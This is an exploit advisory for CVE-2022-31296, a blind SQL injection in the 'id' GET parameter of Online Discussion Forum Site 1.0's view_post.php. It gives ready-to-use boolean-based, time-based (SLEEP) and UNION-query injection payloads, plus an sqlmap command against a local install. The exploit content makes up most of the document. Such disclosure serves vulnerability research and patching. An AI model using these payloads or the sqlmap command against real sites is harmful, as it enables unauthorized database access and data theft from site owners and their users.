# CVE-2022-31296
Online Discussion Forum Site 1.0 - Blind SQL Injection

#### Exploit Title: Online Discussion Forum Site 1.0 - Blind SQL Injection
#### Date: 2022-06-13
#### CVE: CVE-2022-31296
#### Exploit Author: Abdulaziz Saad (@b4zb0z)
#### Vendor Homepage: https://www.sourcecodester.com/
#### Software Link: https://www.sourcecodester.com/php/15337/online-discussion-forum-site-phpoop-free-source-code.html
#### Version: 1.0
#### Tested on: LAMP, Ubuntu

-----

[#] Vulnerability Location:
	`$_GET['id']` in `/odfs/posts/view_post.php:3`
	
>   
    Parameter: id (GET)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause
    Payload: p=posts/view_post&id=1' AND 8036=8036 AND 'zhKq'='zhKq
>
    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: p=posts/view_post&id=1' AND (SELECT 4593 FROM (SELECT(SLEEP(5)))Tmcg) AND 'qyDN'='qyDN
>
    Type: UNION query
    Title: Generic UNION query (NULL) - 12 columns
    Payload: p=posts/view_post&id=-5399' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(0x7171767671,0x5a7272534b4b78734a53464e62454b52617876484e6670665570454454526a6963626f506e45776e,0x717a707671)-- -

---

[#] Exploitation Using SQLMAP:
	`sqlmap -u "http://localhost/odfs/?p=posts/view_post&id=1" --dbms=mysql`
